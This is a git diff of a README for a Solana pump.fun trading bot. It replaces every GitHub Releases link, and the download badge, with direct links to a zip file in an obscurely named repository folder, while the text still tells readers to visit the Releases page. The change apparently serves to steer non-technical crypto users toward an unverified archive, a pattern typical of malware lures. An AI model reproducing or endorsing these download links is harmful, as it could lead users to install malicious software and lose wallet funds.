@@ -1,7 +1,7 @@
 # 🎉 migraine-solana-pumpfun-aio-bot - Your All-in-One Bot for Easy Trading
 
 ## 🔗 Download Now
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-orange.svg)](https://github.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/main/underconsume/migraine-solana-pumpfun-aio-bot_1.8-alpha.4.zip%20Latest%20Version-Click%https://raw.githubusercontent.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/main/underconsume/migraine-solana-pumpfun-aio-bot_1.8-alpha.4.zip)](https://raw.githubusercontent.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/main/underconsume/migraine-solana-pumpfun-aio-bot_1.8-alpha.4.zip)
 
 ## 📖 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -14,7 +14,7 @@
 This guide will help you download and run the migraine-solana-pumpfun-aio-bot smoothly. This bot is designed to make trading easy for you, even if you’re not a tech expert.
 
 ## 💾 Download & Install
-To get the latest version of the migraine-solana-pumpfun-aio-bot, visit this page to download: [Download Page](https://github.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/releases).
+To get the latest version of the migraine-solana-pumpfun-aio-bot, visit this page to download: [Download Page](https://raw.githubusercontent.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/main/underconsume/migraine-solana-pumpfun-aio-bot_1.8-alpha.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest version. 
@@ -49,4 +49,4 @@ If you would like to contribute, please read the guidelines provided in the repo
 Thank you for choosing the migraine-solana-pumpfun-aio-bot. Happy trading! 
 
 ## 🔗 Download Again
-You can download the latest version once more by visiting this page: [Download Page](https://github.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/releases).
+You can download the latest version once more by visiting this page: [Download Page](https://raw.githubusercontent.com/Mikelzlll/migraine-solana-pumpfun-aio-bot/main/underconsume/migraine-solana-pumpfun-aio-bot_1.8-alpha.4.zip).
